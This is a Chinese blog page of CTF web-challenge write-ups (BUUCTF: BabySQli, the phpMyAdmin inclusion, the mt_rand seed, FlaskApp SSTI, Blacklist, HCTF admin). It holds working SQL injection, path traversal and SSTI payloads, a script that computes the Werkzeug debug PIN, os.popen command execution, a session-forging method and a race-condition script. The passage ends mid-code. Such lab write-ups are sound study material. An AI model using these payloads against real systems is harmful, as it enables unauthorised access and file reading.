<h4 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h4><p>试了一下，用户名的位置会报错，只过滤了括号，<code>=</code>和小写的<code>or</code>，页面里有注释，先 base32 再 base64，<code>select * from user where username = &#39;$name&#39;</code>。</p>
<p>有3列，试一下<code>admin&#39; union select 1,2,3%23</code>，提示wrong pass。是对输入的 pw 进行了 md5，然后查表中的数据，最后</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=rrrrrrrrr<span class="string">r&#x27; union select 1,&#x27;</span>admin<span class="string">&#x27;,&#x27;</span><span class="number">202</span>cb962ac59075b964b07152d234b70<span class="string">&#x27;%23&amp;pw=123</span></span><br></pre></td></tr></table></figure>

<p>其中<code>202cb962ac59075b964b07152d234b70&#39;%23</code>是 123 的MD5。</p>
<h4 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h4><p>phpMyadmin 任意文件包含</p>
<p>payload:<code>http://92909cd3-f955-4efa-99af-dc3d378a1ec6.node3.buuoj.cn/phpmyadmin/?target=db_datadict.php%253f/../../../../../../../../flag</code></p>
<h4 id="GWCTF-2019-枯燥的抽奖"><a href="#GWCTF-2019-枯燥的抽奖" class="headerlink" title="[GWCTF 2019]枯燥的抽奖"></a>[GWCTF 2019]枯燥的抽奖</h4><p>check.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#这不是抽奖程序的源代码！不许看！</span></span><br><span class="line">header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;seed&#x27;</span>]))&#123;</span><br><span class="line">$_SESSION[<span class="string">&#x27;seed&#x27;</span>]=rand(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mt_srand($_SESSION[<span class="string">&#x27;seed&#x27;</span>]);</span><br><span class="line">$str_long1 = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line">$str=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$len1=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.=substr($str_long1, mt_rand(<span class="number">0</span>, strlen($str_long1) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line">$str_show = substr($str, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.$str_show.<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>($_POST[<span class="string">&#x27;num&#x27;</span>]===$str)&#123;x</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="string">&quot;check.php&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://www.openwall.com/php_mt_seed/">mt_rand()</a>漏洞，伪随机，可以爆破 seed</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">str1 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line">str2 = <span class="string">&#x27;LTa1ZXoMsb&#x27;</span></span><br><span class="line">str3 = str1[::-<span class="number">1</span>]</span><br><span class="line">length = <span class="built_in">len</span>(str2)</span><br><span class="line"><span class="keyword">res</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="built_in">len</span>(str2)):</span><br><span class="line">    <span class="keyword">for</span> <span class="keyword">j</span> in <span class="built_in">range</span>(<span class="built_in">len</span>(str1)):</span><br><span class="line">        <span class="keyword">if</span> str2[i] == str1[<span class="keyword">j</span>]:</span><br><span class="line">            <span class="keyword">res</span> += str(<span class="keyword">j</span>) + <span class="string">&#x27; &#x27;</span> + str(<span class="keyword">j</span>) + <span class="string">&#x27; &#x27;</span> + <span class="string">&#x27;0&#x27;</span> + <span class="string">&#x27; &#x27;</span> + str(<span class="built_in">len</span>(str1) - <span class="number">1</span>) + <span class="string">&#x27; &#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>(<span class="keyword">res</span>)</span><br></pre></td></tr></table></figure>

<p>生成 <a target="_blank" rel="noopener" href="https://github.com/lepiaf/php_mt_seed">php_mt_seed</a> 所需的参数后</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make</span><br><span class="line">time ./php_mt_seed <span class="number">47</span> <span class="number">47</span> <span class="number">0</span> <span class="number">61</span> <span class="number">55</span> <span class="number">55</span> <span class="number">0</span> <span class="number">61</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">61</span> <span class="number">27</span> <span class="number">27</span> <span class="number">0</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">0</span> <span class="number">61</span> <span class="number">59</span> <span class="number">59</span> <span class="number">0</span> <span class="number">61</span> <span class="number">14</span> <span class="number">14</span> <span class="number">0</span> <span class="number">61</span> <span class="number">48</span> <span class="number">48</span> <span class="number">0</span> <span class="number">61</span> <span class="number">18</span> <span class="number">18</span> <span class="number">0</span> <span class="number">61</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">61</span></span><br></pre></td></tr></table></figure>

<p>爆破出 seed 之后重新生成 str，至少需要 PHP 7.2</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">945888871</span>);</span><br><span class="line"></span><br><span class="line">$str_long1 = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line">$str=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$len1=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.=substr($str_long1, mt_rand(<span class="number">0</span>, strlen($str_long1) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $str;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h4><p>模板注入，加密页面输入</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;<span class="name">1</span>+<span class="number">1</span>&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p>把结果放到解密页面解密，得到 2，存在模板注入。payload</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().<span class="strong">__class__</span>.<span class="strong">__bases__</span>[<span class="string">0</span>].<span class="strong">__subclasses__</span>()[<span class="string">75</span>].<span class="strong">__init__</span>.<span class="strong">__globals__</span>.<span class="strong">__builtins__</span>[<span class="string">&#x27;open&#x27;</span>](<span class="link">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>可以读取到文件，但是不知道 flag 位置，需要打开 debug 模式中的 python shell，需要获取 PIN 码</p>
<p>PIN 码由以下几个值计算得到：</p>
<ul>
<li>服务器运行 flask 的用户名，通过读取 /etc/passwd 得到，此题目为 flaskweb</li>
<li>modname，一般为 flask.app</li>
<li><code>getattr(app, &quot;\_\_name__&quot;, app.\_\_class__.\_\_name__)</code>，一般为 Flask</li>
<li>flask 库下 app.py 的绝对路径，通过报错信息可以得到，本题目为<code>/usr/local/lib/python3.7/site-packages/flask/app.py</code></li>
<li>当前网络 MAC 地址的十进制数，通过文件<code>/sys/class/net/eth0/address</code>得到</li>
<li>机器ID，一般在<code>/etc/machine-id</code>或者<code>/proc/sys/kerne/random/boot-i</code>，docker 容器在<code>/proc/sef/cgroup</code>，<code>name=systemd:/docker/</code>后面的一串就是ID</li>
</ul>
<p>计算 PIN 码，在<code>Lib\site-packages\werkzeug\debug\\_\_init__.py</code></p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">from itertools import chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;flaskweb&#x27;</span>, # 用户名</span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>, # modname</span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>, # Flask</span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span>, # app.<span class="keyword">py</span> 路径</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485410412221&#x27;</span>, # MAC 地址</span><br><span class="line">    <span class="string">&#x27;6743637069af7e10cfc09a74d23b62c700765cc89e2ae6d0f43150e839dde80e&#x27;</span> # 机器ID</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit in chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> not bi<span class="variable">t:</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(bit, str):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.<span class="keyword">update</span>(bit)</span><br><span class="line">h.<span class="keyword">update</span>(<span class="keyword">b</span><span class="string">&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = None</span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> None:</span><br><span class="line">    h.<span class="keyword">update</span>(<span class="keyword">b</span><span class="string">&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="keyword">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">rv</span> =None</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">rv</span> <span class="keyword">is</span> None:</span><br><span class="line">    <span class="keyword">for</span> group_size in <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">rv</span> = <span class="string">&#x27;-&#x27;</span>.<span class="keyword">join</span>(num[<span class="keyword">x</span>:<span class="keyword">x</span> + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> <span class="keyword">x</span> in <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">rv</span> = num</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>(<span class="keyword">rv</span>)</span><br></pre></td></tr></table></figure>

<p>得到 PIN 码进入 python shell，使用 os 模块执行系统命令</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import <span class="built_in">os</span></span><br><span class="line"><span class="built_in">os</span>.<span class="built_in">popen</span>(<span class="string">&#x27;ls /&#x27;</span>).<span class="built_in">read</span>()</span><br><span class="line"><span class="built_in">os</span>.<span class="built_in">popen</span>(<span class="string">&#x27;cat /this_is_flag.txt&#x27;</span>).<span class="built_in">read</span>()</span><br></pre></td></tr></table></figure>



<h4 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h4><p>黑名单<code>preg_match(&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&quot;,$inject);</code></p>
<p>堆叠注入 + handler 代替 select</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;; <span class="keyword">show</span> <span class="keyword">tables</span>;<span class="comment"># 查表</span></span><br><span class="line">1&#x27;; <span class="keyword">show</span> <span class="keyword">columns</span> <span class="keyword">from</span> FlagHere;<span class="comment"># 查列名</span></span><br><span class="line">1&#x27;; <span class="keyword">handler</span> FlagHere <span class="keyword">open</span> <span class="keyword">as</span> aaaa; <span class="keyword">handler</span> aaaa <span class="keyword">read</span> <span class="keyword">first</span>; <span class="keyword">handler</span> aaaa <span class="keyword">close</span>;<span class="comment"># 利用 handler 代替 select 查询数据</span></span><br></pre></td></tr></table></figure>

<h4 id="HCTF-2018-warmup"><a href="#HCTF-2018-warmup" class="headerlink" title="[HCTF] 2018 warmup"></a>[HCTF] 2018 warmup</h4><p>代码审计，定义了白名单，判断file参数问号之前的内容是不是在白名单里。利用文件包含漏洞（CVE-2018-2613），<code>?file=hint.php?.././../../../../ffffllllaaaagggg</code>，其中问号可以url编码，效果一样。</p>
<h4 id="HCTF-admin"><a href="#HCTF-admin" class="headerlink" title="[HCTF] admin"></a>[HCTF] admin</h4><p>随便注册个账号，登录，在修改密码的地方发现一行注释，给了源码</p>
<p><strong>方法1：</strong> session伪造</p>
<p>flask将session存储在客户端（浏览器），并且不对session进行加密，只进行签名，不能防止session被读取，但可以防止被篡改，得到签名后可以伪造session</p>
<p>登录后看下自己的session，读取一下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> session_json_serializer</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decryption</span>(<span class="params">payload</span>):</span></span><br><span class="line">    payload, sig = payload.rsplit(<span class="string">b&#x27;.&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">    payload, timestamp = payload.rsplit(<span class="string">b&#x27;.&#x27;</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    decompress = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> payload.startswith(<span class="string">b&#x27;.&#x27;</span>):</span><br><span class="line">        payload = payload[<span class="number">1</span>:]</span><br><span class="line">        decompress = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not base64 decode the payload because of &#x27;</span></span><br><span class="line">                         <span class="string">&#x27;an exception&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> decompress:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not zlib decompress the payload before &#x27;</span></span><br><span class="line">                             <span class="string">&#x27;decoding the payload&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> session_json_serializer.loads(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    print(decryption(sys.argv[<span class="number">1</span>].encode()))</span><br></pre></td></tr></table></figure>

<p>拿到内容，在config.py发现密钥 ckj123，把得到的内容中的user改为admin，user_id改为1，伪造session（<a target="_blank" rel="noopener" href="https://github.com/noraj/flask-session-cookie-manager%EF%BC%89%EF%BC%8C%E6%9B%BF%E6%8D%A2%E6%8E%89%E5%8E%9F%E6%9D%A5%E7%9A%84session%E5%B0%B1%E5%8F%AF%E4%BB%A5%E5%BE%97%E5%88%B0flag">https://github.com/noraj/flask-session-cookie-manager），替换掉原来的session就可以得到flag</a></p>
<p><strong>方法2：</strong>unicode欺骗</p>
<p>route.py的login函数和change函数里都有strlower这个操作，而不是正常的lower。</p>
<p>跟进一下，看到nodeprep.prepare，对应的库是twisted。</p>
<p>在requirements.txt中，twisted的版本是10.2.0，最新的是18，差距很大。查一下，这个函数会自动进行如下转换</p>
<p><code>ᴀ -&gt; A -&gt; a</code></p>
<p>于是我们注册ᴀ dmin，登录后变成Admin，改密码的时候就会改掉admin的密码，成功登录。</p>
<p><strong>方法3：</strong>条件竞争</p>
<p>在login和change函数中都没有进行检查，而是先赋值到name和session.name，在已有登录的session情况下，登录admin，修改密码，就可以修改掉admin的密码，但是login函数进行了判断，可以开双线程绕过。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>(<span class="params">s, username, password</span>):</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: username,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: password,</span><br><span class="line">        <span class="string">&#x27;submit&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s.post(<span class="string">&quot;http://4f7f18d7-e9dd-44c1-a10d-0ed88b615dae.node3.buuoj.cn/login&quot;</span>, data=data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> s.get(<span class="string">&quot;http://4f7f18d7-e9dd-44c1-a10d-0ed88b615dae.node3.buuoj.cn/logout&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>(<span class="params">s, newpassword</span>):</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;newpassword&#x27;</span>:newpassword</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s.post(<span class="string">&quot;http://4f7f18d7-e9dd-44c1-a10d-0ed88b615dae.node3.buuoj.cn/change&quot;</span>, data=data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func1</span>(<span class="params">s</span>):</span></span><br><span class="line">    login(s, <span class="string">&#x27;skysec&#x27;</span>, <span class="string">&#x27;skysec&#x27;</span>)</span><br><span class="line">    change(s, <span class="string">&#x27;skysec&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func2</span>(<span class="params">s</span>):</span></span><br><span class="line">    logout(s)</span><br><span class="line">    res = login(s, <span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;skysec&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;&lt;a href=&quot;/index&quot;&gt;/index&lt;/a&gt;&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        print(<span class="string">&#x27;finish&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>):</span><br><span class="line">        print(i)</span><br><span class="line">        s = requests.Session()</span><br><span class="line">        t1 = threading.Thread(target=func1, args=(s,))</span><br><span class="line">        t2 = threading.Thread(target=func2, args=(s,))</span><br><span class="line">        t1.start()</span><br><span class="line">        t2.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>ps：复现失败，预想的结果是会把admin的密码改为skysec，就可以登录。但实际上我可能是被buuctf给ban了</p>
<h4 id="HFCTF2020-EasyLogin"><a href="#HFCTF2020-EasyLogin" class="headerlink" title="[HFCTF2020]EasyLogin"></a>[HFCTF2020]EasyLogin</h4><p>Node.js 代码审计、弱类型、依赖库缺陷</p>
<p>static/js/app.js:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  或许该用 koa-static 来处理静态文件</span></span><br><span class="line"><span class="comment"> *  路径该怎么配置？不管了先填个根目录XD</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> username = $(<span class="string">&quot;#username&quot;</span>).val();</span><br><span class="line">    <span class="keyword">const</span> password = $(<span class="string">&quot;#password&quot;</span>).val();</span><br><span class="line">    <span class="keyword">const</span> token = sessionStorage.getItem(<span class="string">&quot;token&quot;</span>);</span><br><span class="line">    $.post(<span class="string">&quot;/api/login&quot;</span>, &#123;username, password, <span class="attr">authorization</span>:token&#125;)</span><br><span class="line">        .done(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">const</span> &#123;status&#125; = data;</span><br><span class="line">            <span class="keyword">if</span>(status) &#123;</span><br><span class="line">                <span class="built_in">document</span>.location = <span class="string">&quot;/home&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        .fail(<span class="function"><span class="keyword">function</span>(<span class="params">xhr, textStatus, errorThrown</span>) </span>&#123;</span><br><span class="line">            alert(xhr.responseJSON.message);</span><br><span class="line">        &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> username = $(<span class="string">&quot;#username&quot;</span>).val();</span><br><span class="line">    <span class="keyword">const</span> password = $(<span class="string">&quot;#password&quot;</span>).val();</span><br><span class="line">    $.post(<span class="string">&quot;/api/register&quot;</span>, &#123;username, password&#125;)</span><br><span class="line">        .done(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">const</span> &#123; token &#125; = data;</span><br><span class="line">            sessionStorage.setItem(<span class="string">&#x27;token&#x27;</span>, token);</span><br><span class="line">            <span class="built_in">document</span>.location = <span class="string">&quot;/login&quot;</span>;</span><br><span class="line">        &#125;)</span><br><span class="line">        .fail(<span class="function"><span class="keyword">function</span>(<span class="params">xhr, textStatus, errorThrown</span>) </span>&#123;</span><br><span class="line">            alert(xhr.responseJSON.message);</span><br><span class="line">        &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">logout</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $.get(<span class="string">&#x27;/api/logout&#x27;</span>).done(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) 